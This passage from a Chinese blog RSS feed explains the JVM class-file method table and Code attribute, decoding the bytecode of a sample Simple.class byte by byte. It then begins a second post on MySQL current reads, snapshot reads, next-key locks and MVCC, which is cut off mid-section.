&lt;p&gt;code属性比较复杂，它是经过编译器编译成字节码指令之后的数据。就是说&lt;code&gt;java程序中的方法体经过javac编译器处理后，最终变成字节码存储在Code属性内&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;并非所有方法表都有这个属性，接口和抽象类就没有【没有方法体】。
Code属性是Class文件中最重要的一个属性，在Class文件中，Code属性用于描述代码，所有的其它数据项目都用来描述元数据，了解code属性对了解字
节码执行引擎来说是必要基础。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235758419-1368030226.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Code属性表&lt;/strong&gt;的组成部分：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;机器指令——code&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;目前的&lt;strong&gt;JVM&lt;/strong&gt;使用一个字节表示机器操作码，即对&lt;strong&gt;JVM&lt;/strong&gt;底层而言，它能表示的机器操作码不多于&lt;strong&gt;2&lt;/strong&gt;的 &lt;strong&gt;8&lt;/strong&gt; 次方，即 &lt;strong&gt;256&lt;/strong&gt;个。&lt;strong&gt;class&lt;/strong&gt;文件中的机器指令部分是&lt;strong&gt;class&lt;/strong&gt;文件中最重要的部分，并且非常复杂。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;异常处理跳转信息&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果代码中出现了&lt;strong&gt;&lt;code&gt;try{}catch{}&lt;/code&gt;&lt;/strong&gt;块，那么&lt;strong&gt;try{}&lt;/strong&gt;块内的机器指令的地址范围记录下来，并且记录对应的&lt;strong&gt;catch{}&lt;/strong&gt;块中的起始机器指令地址，当运行时在&lt;strong&gt;try&lt;/strong&gt;块中有异常抛出的话，&lt;strong&gt;JVM&lt;/strong&gt;会将&lt;strong&gt;catch{}&lt;/strong&gt;块对应懂得其实机器指令地址传递给&lt;strong&gt;PC寄存器&lt;/strong&gt;，从而实现指令跳转；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Java源码行号和机器指令的对应关系&lt;/code&gt;---LineNumberTable属性表&lt;/p&gt;
&lt;p&gt;编译器在将java源码编译成class文件时，会将源码中的语句行号跟编译好的机器指令关联起来，这样的class文件加载到内存中并运行时，如果抛出异常，JVM可以根据这个对应关系，抛出异常信息，告诉我们我们的源码的多少行有问题，方便我们定位问题。&lt;/p&gt;
&lt;p&gt;Code属性表结构体:&lt;/p&gt;
&lt;p&gt;1、&lt;code&gt;attribute_name_index&lt;/code&gt; : 属性名称索引，占有2个字节，其内的值指向了常量池中的某一项，该项表示字符. 串“Code”;&lt;/p&gt;
&lt;p&gt;2、&lt;code&gt;attribute_length&lt;/code&gt; : 属性长度，占有 4个字节，其内的值表示后面有多少个字节是属于此Code属性表的；&lt;/p&gt;
&lt;p&gt;3、&lt;code&gt;max_stack&lt;/code&gt; : 操作数栈深度的最大值，占有 2 个字节，在方法执行的任意时刻，操作数栈都不应该超过这个值，虚拟机的运行的时候，会根据这个值来设置该方法对应的栈帧(Stack Frame)中的操作数栈的深度；&lt;/p&gt;
&lt;p&gt;4、&lt;code&gt;max_locals&lt;/code&gt; 最大局部变量数目，占有 2个字节，其内的值表示局部变量表所需要的存储空间大小；&lt;/p&gt;
&lt;p&gt;5、&lt;code&gt;code_length&lt;/code&gt; : 机器指令长度，占有 4 个字节，表示跟在其后的多少个字节表示的是机器指令；&lt;/p&gt;
&lt;p&gt;6、&lt;code&gt;code&lt;/code&gt; 机器指令区域，该区域占有的字节数目由 code_length中的值决定。JVM最底层的要执行的机器指令就存储在这里；&lt;/p&gt;
&lt;p&gt;7、&lt;code&gt;exception_table_length&lt;/code&gt; : 显式异常表长度，占有2个字节，如果在方法代码中出现了try{} catch()形式的结构，该值不会为空，紧跟其后会跟着若干个exception_table结构体，以表示异常捕获情况；&lt;/p&gt;
&lt;p&gt;8、&lt;code&gt;exception_table&lt;/code&gt; : 显式异常表，占有8 个字节，start_pc,end_pc,handler_pc中的值都表示的是PC计数器中的指令地址。exception_table表示的意思是：如果字节码从第start_pc行到第end_pc行之间出现了catch_type所描述的异常类型，那么将跳转到handler_pc行继续处理。&lt;/p&gt;
&lt;p&gt;9、&lt;code&gt;attribute_count&lt;/code&gt; : 属性计数器，占有 2 个字节，表示Code属性表的其他属性的数目&lt;/p&gt;
&lt;p&gt;10、&lt;code&gt;attribute_info&lt;/code&gt; : 表示Code属性表具有的属性表，它主要分为两个类型的属性表：“LineNumberTable”类型和“LocalVariableTable”类型。“LineNumberTable”类型的属性表记录着Java源码和机器指令之间的对应关系“LocalVariableTable”类型的属性表记录着局部变量描述&lt;/p&gt;
&lt;h4 id=&quot;constantvalue属性&quot;&gt;2、ConstantValue属性&lt;/h4&gt;
&lt;p&gt;之所以学习这个，是因为后面类加载机制有联系到这个属性&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;这个属性的作用是通知虚拟机为静态变量赋值，只要被static修饰的变量才有这个属性，【有该属性的字段必须有ACC_STATIC访问标志，反过来不一定】。&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;对于 &quot;int x = 123&quot; 和 &quot;static int x =123&quot;这类代码在日常编写中很常见，但虚拟机对这两种变量赋值的时刻却不同。
对于非static变量[实例变量]，是在实例构造器&amp;lt;init&amp;gt;进行
对于类变量,有两种方式选择
①在类构造器&amp;lt;clinit&amp;gt;方法中赋值
②使用ConstantValue属性初始化
目前Sun javac编译器是这么做的【具体咋做不知道 = =】，如果同时使用final和static修饰一个变量[这种修饰就相当于个常量],并且是String或基本类型，就使用②，
如果没有被final修饰或不是基本类型和String，就选择①在&amp;lt;clinit&amp;gt;方法中初始化
//有关这点我在上篇博客举过例子，最后几句话也对这个解释的很清楚。&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;三示例&quot;&gt;&lt;span&gt;三、示例&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;有关方法的代码示例，我就不亲自测了，因为有位博主写的已经很清晰啦，我自己写也没那么清晰。&lt;/p&gt;
&lt;h4 id=&quot;访问标志&quot;&gt;1、访问标志&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;public static synchronized final void greeting(){  
}  &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;greeting()&lt;/strong&gt;方法的修饰符有：public、static、synchronized、final 这几个修饰符修饰，那么相对地，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;greeting()&lt;/strong&gt;方法的访问标志中的&lt;code&gt;ACC_PUBLIC&lt;/code&gt;、&lt;code&gt;ACC_STATIC&lt;/code&gt;、&lt;code&gt;ACC_SYNCHRONIZED&lt;/code&gt;、&lt;code&gt;ACC_FINAL&lt;/code&gt;标志位都应该是&lt;strong&gt;1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从上面第一张图可以得出,该&lt;strong&gt;访问标志&lt;/strong&gt;的值应该是十六进制&lt;code&gt;0x0039&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&quot;名称索引和描述符索引&quot;&gt;2、名称索引和描述符索引&lt;/h4&gt;
&lt;p&gt;紧接着&lt;strong&gt;访问标志（access_flags）&lt;/strong&gt;后面的&lt;strong&gt;两个字节&lt;/strong&gt;，叫做&lt;strong&gt;名称索引&lt;/strong&gt;(&lt;strong&gt;name_index&lt;/strong&gt;)，这两个字节中的值是指向了常量池中某个常量池项的索引，该常量池项表示这这个方法名称的字符串。&lt;/p&gt;
&lt;p&gt;​ &lt;strong&gt;方法描述符索引(descrptor_index)&lt;/strong&gt;是紧跟在&lt;strong&gt;名称索引&lt;/strong&gt;后面的两个字节，这两个字节中的值跟名称索引中的值性质一样，都是指向了常量池中的某个常量池项。这两个字节中的指向的常量池项，&lt;strong&gt;是表示了方法描述符的字符串&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235837914-1194106857.jpg&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;代码示例&quot;&gt;3、代码示例&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;package com.louis.jvm;  
public class Simple {  
    public static synchronized final void greeting(){  
        int a = 10;  
    }  
} &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;1)、 &lt;code&gt;Simple.class文件如下所示&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235905646-2145707810.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; :方法表集合的头两个字节，即&lt;strong&gt;方法表计数器（method_count）&lt;/strong&gt;的值是&lt;strong&gt;0x0002&lt;/strong&gt;，它表示该类中有&lt;strong&gt;2&lt;/strong&gt; 个方法。注意到，我们的&lt;strong&gt;Simple.java&lt;/strong&gt;中就定义了一个greeting()方法，为什么&lt;strong&gt;class&lt;/strong&gt;文件中会显示有两个方法呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;：如果我们在类中没有定义实例化构造方法，&lt;strong&gt;JVM&lt;/strong&gt;编译器在将源码编译成&lt;strong&gt;class&lt;/strong&gt;文件时，会自动地为这个类添加一个不带参数的实例化构造方法，这种添加是字节码级别的，JVM对所有的类实例化构造方法名采用了相同的名称：“”。如果我们显式地如下定义&lt;strong&gt;Simple()&lt;/strong&gt;构造函数，这个类编译出来的&lt;strong&gt;class&lt;/strong&gt;文件和上面的不带&lt;strong&gt;Simple&lt;/strong&gt;构造方法的&lt;strong&gt;Simple&lt;/strong&gt;类生成的&lt;strong&gt;class&lt;/strong&gt;文件是完全相同的。&lt;/p&gt;
&lt;p&gt;2)、&lt;code&gt;Simple.class 中的&amp;lt;init&amp;gt;() 方法&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235935464-1875058370.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解释：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、&lt;code&gt;方法访问标志(access_flags)&lt;/code&gt; ： 占有 &lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,即标志位的第 &lt;strong&gt;16&lt;/strong&gt; 位为 &lt;strong&gt;1&lt;/strong&gt;，所以该&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;方法的修饰符是：&lt;strong&gt;ACC_PUBLIC&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;2、 &lt;code&gt;名称索引(name_index)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为 &lt;strong&gt;0x0004&lt;/strong&gt;，指向常量池的第 &lt;strong&gt;4&lt;/strong&gt;项，该项表示字符串'&amp;lt;init&amp;gt;'，即该方法的名称是'&amp;lt;init&amp;gt;';&lt;/p&gt;
&lt;p&gt;3、&lt;code&gt;描述符索引(descriptor_index)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0005&lt;/strong&gt;,指向常量池的第 &lt;strong&gt;5&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;()V&lt;/strong&gt;”，即表示该方法不带参数，并且无返回值（构造函数确实也没有返回值）；&lt;/p&gt;
&lt;p&gt;4、&lt;code&gt;属性计数器（attribute_count)&lt;/code&gt; : 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示该方法表中含有一个属性表，后面会紧跟着一个属性表；&lt;/p&gt;
&lt;p&gt;5、&lt;code&gt;属性表的名称索引(attribute_name_index)&lt;/code&gt; ：占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0006&lt;/strong&gt;,指向常量池中的第&lt;strong&gt;6&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;Code&lt;/strong&gt;”，表示这个属性表是&lt;strong&gt;Code&lt;/strong&gt;类型的属性表；&lt;/p&gt;
&lt;p&gt;6、 &lt;code&gt;属性长度（attribute_length)&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0011&lt;/strong&gt;，即十进制的 &lt;strong&gt;17&lt;/strong&gt;，表明后续的 &lt;strong&gt;17&lt;/strong&gt; 个字节可以表示这个&lt;strong&gt;Code&lt;/strong&gt;属性表的属性信息；&lt;/p&gt;
&lt;p&gt;7、 &lt;code&gt;操作数栈的最大深度（max_stack）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示栈帧中操作数栈的最大深度是&lt;strong&gt;1&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;8、&lt;code&gt;局部变量表的最大容量（max_variable）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;, &lt;strong&gt;JVM&lt;/strong&gt;在调用该方法时，根据这个值设置栈帧中的局部变量表的大小；&lt;/p&gt;
&lt;p&gt;9、 &lt;code&gt;机器指令数目(code_length)&lt;/code&gt; ：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0005&lt;/strong&gt;,表示后续的&lt;strong&gt;5&lt;/strong&gt; 个字节 &lt;strong&gt;0x2A 、0xB7、 0x00、0x01、0xB1&lt;/strong&gt;表示机器指令;&lt;/p&gt;
&lt;p&gt;10、&lt;code&gt;机器指令集(code[code_length])&lt;/code&gt;：这里共有 &lt;strong&gt;5&lt;/strong&gt;个字节，值为&lt;strong&gt;0x2A 、0xB7、 0x00、0x01、0xB1&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;11、&lt;code&gt;显式异常表集合（exception_table_count)&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;,表示方法中没有需要处理的异常信息；&lt;/p&gt;
&lt;p&gt;12、&lt;code&gt;Code属性表的属性表集合（attribute_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;，表示它没有其他的属性表集合，因为我们使用了&lt;strong&gt;-g:none&lt;/strong&gt; 禁止编译器生成&lt;strong&gt;Code属性表&lt;/strong&gt;的 &lt;strong&gt;LineNumberTable 和LocalVariableTable&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;解释下机器指令集：&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;第一个字节 **0x2A&lt;/code&gt;：查询Java 虚拟机规范中关于操作码的解释，&lt;strong&gt;0x2A&lt;/strong&gt; 对应的操作是&quot;&lt;strong&gt;aload_0&lt;/strong&gt;&quot;,作用是将第一个引用类型局部变量推送至栈顶；&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;第二个字节 0xB7&lt;/code&gt; :&lt;strong&gt;0xB7&lt;/strong&gt; 对应的操作是：&quot;&lt;strong&gt;invokespecial&lt;/strong&gt;&quot;,作用是调用超类构造方法、实例初始化方法或私有方法；&lt;strong&gt;它带有2个字节的参数，即后面的 0x00、0x01 是它的参数&lt;/strong&gt;，这个参数是某个常量池中的索引，指向了常量池的第一项，该项表示一个方法引用项&lt;strong&gt;CONSTANT_Methodref_info&lt;/strong&gt;结构体，表示&lt;strong&gt;java.lang.Object&lt;/strong&gt; 类中的&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;方法，即 &lt;strong&gt;java/lang/Object.&quot;&amp;lt;init&amp;gt;&quot;:()V&lt;/strong&gt;。这条指令的意思就是调用父类Object的构造方法&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;第5个字符是0xB1&lt;/code&gt; : 对应操作是：“&lt;strong&gt;Ireturn&lt;/strong&gt;”,作用是表示无返回值的方法返回，结束方法调用，这条语句放在方法的机器码最后，表示方法结束调用，返回。&lt;/p&gt;
&lt;p&gt;我们可以使用&lt;strong&gt;javap -v Simple &amp;gt; Simple.txt&lt;/strong&gt;，查看反编译信息是怎样显示这一信息的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000014962-41313099.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3）&lt;code&gt;Simple.class 中的greeting() 方法&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000144389-473149865.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;解释：&lt;/p&gt;
&lt;p&gt;1、&lt;code&gt;方法访问标志(access_flags)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt;个字节，值为 &lt;strong&gt;0x0039&lt;/strong&gt; ,即二进制的&lt;strong&gt;00000000 00111001&lt;/strong&gt;,即标志位的第&lt;strong&gt;11、12、13、16&lt;/strong&gt;位为&lt;strong&gt;1&lt;/strong&gt;，根据上面讲的方法标志位的表示，可以得到该&lt;strong&gt;greeting()&lt;/strong&gt;方法的修饰符有：&lt;strong&gt;ACC_SYNCHRONIZED、ACC_FINAL、ACC_STATIC、ACC_PUBLIC&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;2、 &lt;code&gt;名称索引(name_index)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为 &lt;strong&gt;0x0007&lt;/strong&gt;，指向常量池的第 &lt;strong&gt;7&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;greeting&lt;/strong&gt;”，即该方法的名称是“&lt;strong&gt;greeting&lt;/strong&gt;”;&lt;/p&gt;
&lt;p&gt;3、&lt;code&gt;描述符索引(descriptor_index)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0005&lt;/strong&gt;,指向常量池的第 &lt;strong&gt;5&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;()V&lt;/strong&gt;”，即表示该方法不带参数，并且无返回值；&lt;/p&gt;
&lt;p&gt;4、&lt;code&gt;属性计数器（attribute_count)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示该方法表中含有一个属性表，后面会紧跟着一个属性表；&lt;/p&gt;
&lt;p&gt;5、&lt;code&gt;属性表的名称索引(attribute_name_index)&lt;/code&gt; ：占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0006&lt;/strong&gt;,指向常量池中的第&lt;strong&gt;6&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;Code&lt;/strong&gt;”，表示这个属性表是&lt;strong&gt;Code&lt;/strong&gt;类型的属性表；&lt;/p&gt;
&lt;p&gt;6、&lt;code&gt;属性长度（attribute_length）&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0010&lt;/strong&gt;，即十进制的&lt;strong&gt;16&lt;/strong&gt;，表明后续的&lt;strong&gt;16&lt;/strong&gt;个字节可以表示这个&lt;strong&gt;Code&lt;/strong&gt;属性表的属性信息；&lt;/p&gt;
&lt;p&gt;7、&lt;code&gt;操作数栈的最大深度（max_stack）&lt;/code&gt; ：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示栈帧中操作数栈的最大深度是&lt;strong&gt;1&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;8、 &lt;code&gt;局部变量表的最大容量（max_variable）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;, &lt;strong&gt;JVM&lt;/strong&gt;在调用该方法时，根据这个值设置栈帧中的局部变量表的大小；&lt;/p&gt;
&lt;p&gt;9、&lt;code&gt;器指令数目(code_length)&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000 0004,&lt;/strong&gt;表示后续的&lt;strong&gt;4&lt;/strong&gt;个字节&lt;strong&gt;0x10、 0x0A、 0x3B、0xB1&lt;/strong&gt;的是表示机器指令;&lt;/p&gt;
&lt;p&gt;10、&lt;code&gt;机器指令集(code[code_length])&lt;/code&gt;：这里共有&lt;strong&gt;4&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x10、 0x0A、 0x3B、0xB1&lt;/strong&gt; ；&lt;/p&gt;
&lt;p&gt;11、&lt;code&gt;显式异常表集合（exception_table_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;,表示方法中没有需要处理的异常信息；&lt;/p&gt;
&lt;p&gt;12 &lt;code&gt;Code属性表的属性表集合（attribute_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;，表示它没有其他的属性表集合，因为我们使用了&lt;strong&gt;-g:none&lt;/strong&gt; 禁止编译器生成&lt;strong&gt;Code属性表&lt;/strong&gt;的 &lt;strong&gt;LineNumberTable 和LocalVariableTable&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;指令集解释&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个字节 0x10&lt;/code&gt; : 查询Java虚拟机规范中关于操作码的解释，0x10 对应的操作是&quot;bipush&quot;,&quot; 作用是将单字节的常量值（-128~127） 推送至栈顶，它要求一个参数，后面的 0x0A 即是需要推送到栈顶的单字节，注意这里的 0x0A 是16进制，就是我们在代码里写的&quot;a=10&quot;中的10。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第三个字节&quot;3B&quot;&lt;/code&gt; : “3B”对应的操作是：&quot;istore_0&quot;,作用是将栈顶int 型数值存入第一个局部变量。我们在greeting() 方法中就声明了一个局部变量a，JVM的运行的时候，将这个局部变量a解析，并放置到局部变量表中的第一个位置；上述的0x10 0x0A 指令已经将0x0A 推送到了栈顶了，然后 0x3B指令便将栈顶的0x0A 取出，赋值给局部变量表中的第一个参数，即局部变量a，这样就完成了对局部变量a的赋值；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第4个字符是0xB1&lt;/code&gt; : 对应操作是：“Ireturn”,作用是表示无返回值的方法返回，结束方法调用，这条语句放在方法的机器码最后，表示方法结束调用，返回。&lt;/p&gt;
&lt;p&gt;我们可以使用javap -v Simple &amp;gt; Simple.txt，查看反编译信息是怎样显示这一信息的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000205085-433084652.png&quot;/&gt;&lt;/p&gt;

&lt;h3 id=&quot;参考&quot;&gt;&lt;span&gt;参考&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;这篇文章基本上是参考，非常感谢作者分享，写的很清楚:&lt;a href=&quot;https://blog.51cto.com/1459294/1932334&quot;&gt;《Java虚拟机原理图解》&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;只要自己变优秀了，其他的事情才会跟着好起来（少将6）&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Wed, 17 Apr 2019 16:19:00 +0000</pubDate>
<dc:creator>雨点的名字</dc:creator>
<og:description>【JVM虚拟机】(8) 深入理解Class中 方法、属性表集合 之前有关class文件已经写了两篇博客： 1、 '【JVM虚拟机】(5) 深入理解JVM Class中常量池' 2、 '【JVM虚拟机】</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qdhxhz/p/10727117.html</dc:identifier>
</item>
<item>
<title>【MySQL】当前读、快照读、MVCC - wwcom123</title>
<link>http://www.cnblogs.com/wwcom123/p/10727194.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wwcom123/p/10727194.html</guid>
<description>&lt;div readability=&quot;31&quot;&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;&lt;span&gt;当前读:&lt;/span&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;　　select...lock in share mode (共享读锁)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　select...for update&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　update , delete , insert&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　当前读, 读取的是最新版本, 并且对读取的记录加锁, 阻塞其他事务同时改动相同&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;记录&lt;/span&gt;&lt;/span&gt;&lt;span&gt;，避免出现安全问题。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;　　例如，假设要update一条记录，但是另一个事务已经delete这条数据并且commit了，如果不加锁就会产生冲突。所以update的时候肯定要是当前读，得到最新的信息并且锁定相应的记录。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;&lt;span&gt;当前读的实现方式：next-key锁(&lt;/span&gt;行记录锁+&lt;span&gt;Gap间隙锁)&lt;/span&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; &lt;span&gt;　　&lt;strong&gt;间隙锁：&lt;/strong&gt;只有在Read Repeatable、Serializable隔离级别才有，就是锁定那些范围空间内的数据，假设锁定id&amp;gt;3的数据，id有3,4,5，那么4，5和后面的数字都会被锁定，像6,7...，为什么要这样？因为如果我们不锁定没有的数据，当加入了新的数据id=6，就会出现幻读，间隙锁避免了幻读。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　对主键或唯一索引，如果select查询时where条件全部精确命中(=或者in)，这种场景本身就不会出现幻读，所以只会加行记录锁。&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;&lt;span&gt; 快照读&lt;/span&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;span&gt;简单的select操作(不包括 select ... lock in share mode, select ... for update)。&lt;/span&gt;　　　　&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Read Committed隔离级别：每次select都生成一个快照读。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Read Repeatable隔离级别：&lt;/span&gt;&lt;strong&gt;&lt;span&gt;开启事务后第一个select语句才是快照读的地方，而不是一开启事务就快照读。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h2&gt;快照读的实现方式：u&lt;span&gt;ndolog和MVCC&lt;/span&gt;&lt;/h2&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div readability=&quot;12&quot;&gt;
&lt;div readability=&quot;19&quot;&gt;
&lt;p&gt;&lt;span&gt;　&lt;span&gt;　&lt;strong&gt;undolog&lt;/strong&gt;:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;　　每行除了数据外 还有&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;strong&gt;DB_TRX_ID&lt;/strong&gt;: 6字节&lt;code&gt;DB_TRX_ID&lt;/code&gt;字段，表示最后更新的事务id(update,delete,insert)。此外，删除在内部被视为更新，其中行中的特殊位被设置为将其标记为已软删除。&lt;br/&gt;　　&lt;strong&gt;DB_ROLL_PTR&lt;/strong&gt;: 7字节回滚指针，指向前一个版本的undolog记录，组成undo链表。如果更新了行，则撤消日志记录包含在更新行之前重建行内容所需的信息。&lt;br/&gt;　　&lt;strong&gt;DB_ROW_ID&lt;/strong&gt;: &lt;/span&gt;&lt;span&gt;6字节的DB_ROW_ID字段，包含一个随着新行插入而单调递增的行ID, 当由innodb自动产生聚集索引时，聚集索引会包括这个行ID的值，否则这个行ID不会出现在任何索引中。&lt;/span&gt;&lt;span&gt;如果表中没有主键或合适的唯一索引, 也就是无法生成聚簇索引的时候, InnoDB会帮我们自动生成聚集索引, 聚簇索引会使用DB_ROW_ID的值来作为主键; 如果表中有主键或者合适的唯一索引, 那么聚簇索引中也就不会包含 DB_ROW_ID了 。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt; &lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;insert undo log: 只在事务回滚时需要, 事务提交就可以删掉了。&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;update undo log: 包括update 和 delete , 回滚和快照读 都需要。&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;image-package&quot; readability=&quot;13&quot;&gt;
&lt;div class=&quot;image-container&quot; readability=&quot;21&quot;&gt;
&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt; 　　&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　&lt;strong&gt;多版本并发控制MVCC&lt;/strong&gt;：&lt;/span&gt;&lt;/p&gt;
